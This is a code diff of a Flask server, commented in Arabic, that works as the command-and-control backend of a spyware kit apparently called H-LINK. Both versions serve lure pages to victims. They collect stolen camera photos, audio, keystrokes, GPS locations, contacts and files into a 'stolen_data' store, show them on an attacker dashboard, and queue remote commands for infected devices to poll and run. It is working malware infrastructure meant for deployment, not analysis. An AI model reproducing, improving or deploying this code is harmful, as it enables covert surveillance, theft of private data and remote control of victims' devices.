@@ -1,202 +1,216 @@
+from flask import Flask, render_template, request, jsonify, send_from_directory
 import os
 import json
 import base64
-import socket
+import threading
+import time
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, send_file
 
-# تحديد المسار المطلق
-base_dir = os.path.abspath(os.path.dirname(__file__))
+app = Flask(__name__)
 
-app = Flask(__name__, 
-            template_folder=os.path.join(base_dir, 'templates'),
-            static_folder=os.path.join(base_dir, 'static'))
+# ========== تخزين البيانات ==========
+stolen_data = {
+    "photos": [],
+    "audio": [],
+    "keylogs": [],
+    "locations": [],
+    "contacts": [],
+    "files": []
+}
 
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'secret!')
-
-# مجلد التخزين
-STOLEN_DIR = os.path.join(base_dir, "stolen_data")
-for folder in ['camera', 'keys', 'location', 'contacts', 'files']:
-    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)
-
-VICTIM_IP = "Unknown"
-CONTROL_QUEUE = []  # قائمة أوامر التحكم
-
-# ========== صفحات الضحية ==========
+# ========== الصفحات الرئيسية ==========
 @app.route('/')
-def home():
+def index():
     return render_template('index.html')
 
 @app.route('/image')
-def image_page():
+def image_vector():
     return render_template('image.html')
 
 @app.route('/qr')
-def qr_page():
+def qr_vector():
     return render_template('qr.html')
 
-# ========== لوحة التحكم ==========
+# ========== لوحة التحكم (Dashboard) ==========
 @app.route('/dashboard')
 def dashboard():
-    files = {}
-    for cat in ['camera', 'keys', 'location', 'contacts', 'files']:
-        try:
-            files[cat] = os.listdir(os.path.join(STOLEN_DIR, cat))
-        except:
-            files[cat] = []
-    
-    return render_template('dashboard.html', files=files, victim_ip=VICTIM_IP)
+    return render_template('dashboard.html')
 
-# ========== API لجمع البيانات ==========
-@app.route('/api/camera', methods=['POST'])
-def receive_camera():
-    data = request.json
-    victim_id = data.get('victim_id', 'unknown')
-    photo_type = data.get('type', 'front')
-    image_data = data.get('image', '')
-    
-    if image_data:
-        filename = f"{victim_id}_{photo_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-        filepath = os.path.join(STOLEN_DIR, 'camera', filename)
-        
-        image_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
-        with open(filepath, 'wb') as f:
-            f.write(image_bytes)
-        
-        print(f"[📸] صورة {photo_type}: {filename}")
-        return jsonify({"status": "ok"})
-    return jsonify({"status": "error"}), 400
+@app.route('/api/dashboard/data')
+def dashboard_data():
+    """API تعيد جميع البيانات المسروقة للوحة التحكم"""
+    return jsonify(stolen_data)
 
-@app.route('/api/keylog', methods=['POST'])
-def receive_keylog():
+# ========== استقبال البيانات من الضحية ==========
+@app.route('/api/upload', methods=['POST'])
+def upload_data():
     data = request.json
-    global VICTIM_IP
-    VICTIM_IP = request.remote_addr
+    if not data:
+        return jsonify({"status": "error", "message": "No data"}), 400
     
-    log_entry = {
-        'ip': VICTIM_IP,
-        'timestamp': datetime.now().isoformat(),
-        'keys': data.get('keys', ''),
-        'url': data.get('url', '')
+    data_type = data.get('type')
+    content = data.get('content')
+    timestamp = datetime.now().isoformat()
+    
+    record = {
+        "timestamp": timestamp,
+        "ip": request.remote_addr,
+        "user_agent": request.headers.get('User-Agent', 'unknown'),
+        "content": content
     }
     
-    filename = f"keylog_{datetime.now().strftime('%Y%m%d')}.txt"
-    filepath = os.path.join(STOLEN_DIR, 'keys', filename)
+    if data_type == 'photo':
+        stolen_data["photos"].append(record)
+    elif data_type == 'audio':
+        stolen_data["audio"].append(record)
+    elif data_type == 'keylog':
+        stolen_data["keylogs"].append(record)
+    elif data_type == 'location':
+        stolen_data["locations"].append(record)
+    elif data_type == 'contacts':
+        stolen_data["contacts"].append(record)
+    elif data_type == 'file':
+        stolen_data["files"].append(record)
     
-    with open(filepath, 'a', encoding='utf-8') as f:
-        f.write(json.dumps(log_entry) + '\n')
-    
-    print(f"[⌨️] Keys: {data.get('keys', '')[:50]}...")
     return jsonify({"status": "ok"})
 
-@app.route('/api/location', methods=['POST'])
-def receive_location():
+@app.route('/api/upload/photo', methods=['POST'])
+def upload_photo():
+    """استقبال الصور كـ base64"""
     data = request.json
-    ip = request.remote_addr
+    if not data or 'image' not in data:
+        return jsonify({"status": "error"}), 400
     
-    loc_entry = {
-        'ip': ip,
-        'timestamp': datetime.now().isoformat(),
-        'lat': data.get('lat'),
-        'lon': data.get('lon'),
-        'accuracy': data.get('accuracy'),
-        'maps_link': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
-    }
-    
-    filepath = os.path.join(STOLEN_DIR, 'location', f"location_{datetime.now().strftime('%Y%m%d')}.json")
-    
-    with open(filepath, 'a', encoding='utf-8') as f:
-        f.write(json.dumps(loc_entry) + '\n')
-    
-    print(f"[📍] Location: {data.get('lat')}, {data.get('lon')}")
-    return jsonify({"status": "ok"})
-
-@app.route('/api/contacts', methods=['POST'])
-def receive_contacts():
-    data = request.json
-    contacts = data.get('contacts', [])
-    
-    filename = f"contacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-    filepath = os.path.join(STOLEN_DIR, 'contacts', filename)
-    
-    with open(filepath, 'w', encoding='utf-8') as f:
-        json.dump(contacts, f, indent=2, ensure_ascii=False)
-    
-    print(f"[👤] Contacts: {len(contacts)} entries")
-    return jsonify({"status": "ok"})
-
-@app.route('/api/files', methods=['POST'])
-def receive_files():
-    data = request.json
-    file_data = data.get('file', '')
-    filename = data.get('filename', f'file_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
-    
-    if file_data:
-        file_bytes = base64.b64decode(file_data.split(',')[1] if ',' in file_data else file_data)
-        filepath = os.path.join(STOLEN_DIR, 'files', filename)
-        with open(filepath, 'wb') as f:
-            f.write(file_bytes)
-        print(f"[📁] File: {filename}")
-        return jsonify({"status": "ok"})
-    return jsonify({"status": "error"}), 400
-
-# ========== أوامر التحكم (Polling) ==========
-@app.route('/api/control', methods=['POST'])
-def control_victim():
-    """استلام أمر التحكم من لوحة التحكم"""
-    data = request.json
-    action = data.get('action')
-    
-    global CONTROL_QUEUE
-    CONTROL_QUEUE.append({
-        'action': action,
-        'data': data,
-        'timestamp': datetime.now().isoformat()
+    stolen_data["photos"].append({
+        "timestamp": datetime.now().isoformat(),
+        "ip": request.remote_addr,
+        "user_agent": request.headers.get('User-Agent', 'unknown'),
+        "content": data['image'][:100] + "...[BASE64_TRUNCATED]",
+        "camera": data.get('camera', 'unknown'),
+        "full_image": data['image']
     })
-    
-    print(f"[🎮] Command queued: {action}")
-    return jsonify({"status": f"queued_{action}"})
+    return jsonify({"status": "ok"})
 
-@app.route('/api/poll', methods=['GET'])
-def poll_controls():
-    """الضحية يستعلم عن الأوامر"""
-    global CONTROL_QUEUE
-    if CONTROL_QUEUE:
-        cmd = CONTROL_QUEUE.pop(0)
+@app.route('/api/upload/location', methods=['POST'])
+def upload_location():
+    data = request.json
+    if not data:
+        return jsonify({"status": "error"}), 400
+    
+    stolen_data["locations"].append({
+        "timestamp": datetime.now().isoformat(),
+        "ip": request.remote_addr,
+        "lat": data.get('lat'),
+        "lng": data.get('lng'),
+        "accuracy": data.get('accuracy')
+    })
+    return jsonify({"status": "ok"})
+
+@app.route('/api/upload/contacts', methods=['POST'])
+def upload_contacts():
+    data = request.json
+    if not data:
+        return jsonify({"status": "error"}), 400
+    
+    stolen_data["contacts"].append({
+        "timestamp": datetime.now().isoformat(),
+        "ip": request.remote_addr,
+        "contacts": data.get('contacts', [])
+    })
+    return jsonify({"status": "ok"})
+
+@app.route('/api/upload/keylog', methods=['POST'])
+def upload_keylog():
+    data = request.json
+    if not data:
+        return jsonify({"status": "error"}), 400
+    
+    stolen_data["keylogs"].append({
+        "timestamp": datetime.now().isoformat(),
+        "ip": request.remote_addr,
+        "keys": data.get('keys', '')
+    })
+    return jsonify({"status": "ok"})
+
+@app.route('/api/upload/audio', methods=['POST'])
+def upload_audio():
+    data = request.json
+    if not data or 'audio' not in data:
+        return jsonify({"status": "error"}), 400
+    
+    stolen_data["audio"].append({
+        "timestamp": datetime.now().isoformat(),
+        "ip": request.remote_addr,
+        "duration": data.get('duration', 'unknown'),
+        "full_audio": data['audio']
+    })
+    return jsonify({"status": "ok"})
+
+# ========== أوامر التحكم (من اللوحة إلى الضحية) ==========
+# قائمة الأوامر المعلقة
+pending_commands = []
+
+@app.route('/api/command/send', methods=['POST'])
+def send_command():
+    """إرسال أمر من لوحة التحكم إلى الضحية"""
+    data = request.json
+    if not data or 'type' not in data:
+        return jsonify({"status": "error", "message": "Missing command type"}), 400
+    
+    command = {
+        "id": str(len(pending_commands) + 1),
+        "type": data['type'],
+        "params": data.get('params', {}),
+        "timestamp": datetime.now().isoformat()
+    }
+    pending_commands.append(command)
+    return jsonify({"status": "ok", "command_id": command["id"]})
+
+@app.route('/api/command/poll')
+def poll_commands():
+    """الضحية تسأل: هل هناك أوامر جديدة؟"""
+    if pending_commands:
+        cmd = pending_commands.pop(0)
         return jsonify({"command": cmd})
     return jsonify({"command": None})
 
-# ========== عرض الملفات المسروقة ==========
-@app.route('/stolen/<category>/<filename>')
-def serve_stolen(category, filename):
-    safe = ['camera', 'keys', 'location', 'contacts', 'files']
-    if category not in safe:
-        return "Invalid", 400
-    return send_file(os.path.join(STOLEN_DIR, category, filename))
-
-# ========== Health Check ==========
-@app.route('/health')
-def health():
+@app.route('/api/command/status', methods=['POST'])
+def command_status():
+    """الضحية تخبرنا بنتيجة تنفيذ الأمر"""
+    data = request.json
+    print(f"[Command Result] {data}")
     return jsonify({"status": "ok"})
+
+# ========== عرض البيانات المسروقة ==========
+@app.route('/stolen/<category>')
+def view_stolen(category):
+    if category in stolen_data:
+        items = stolen_data[category]
+        html = f"<h1>{category.upper()} - {len(items)} items</h1><hr>"
+        for i, item in enumerate(items):
+            html += f"<div style='border:1px solid #ccc; margin:10px; padding:10px;'>"
+            html += f"<b>#{i+1}</b> | Time: {item.get('timestamp', 'N/A')}<br>"
+            if category == 'photos' and 'full_image' in item:
+                html += f'<img src="data:image/jpeg;base64,{item["full_image"]}" style="max-width:300px"/><br>'
+            elif category == 'locations':
+                lat, lng = item.get('lat'), item.get('lng')
+                if lat and lng:
+                    html += f'📍 <a href="https://www.google.com/maps?q={lat},{lng}" target="_blank">{lat}, {lng}</a>'
+            elif category == 'keylogs':
+                html += f"Keys: <pre>{item.get('keys', '')}</pre>"
+            elif category == 'contacts':
+                contacts = item.get('contacts', [])
+                html += f"Contacts: {len(contacts)} entries<br>"
+                for c in contacts[:5]:
+                    html += f"- {c.get('name', 'N/A')}: {c.get('phone', 'N/A')}<br>"
+            html += "</div>"
+        return html
+    return f"<h1>Category '{category}' not found</h1>", 404
 
 # ========== تشغيل السيرفر ==========
 if __name__ == '__main__':
-    print("""
-╔══════════════════════════════════════╗
-║       H-LINK - Render Ready          ║
-╚══════════════════════════════════════╝
-    """)
-    
-    port = int(os.environ.get("PORT", 5000))
-    
-    print(f"[+] http://0.0.0.0:{port}")
-    print(f"[+] Dashboard: /dashboard")
-    print(f"[+] Health: /health")
-    print("="*40)
-    
-    # استخدام waitress للإنتاج
-    if os.environ.get('RENDER') or os.environ.get('RAILWAY'):
-        from waitress import serve
-        serve(app, host='0.0.0.0', port=port)
-    else:
-        app.run(host='0.0.0.0', port=port, debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=True)
+else:
+    # للإنتاج على Render
+    port = int(os.environ.get('PORT', 5000))
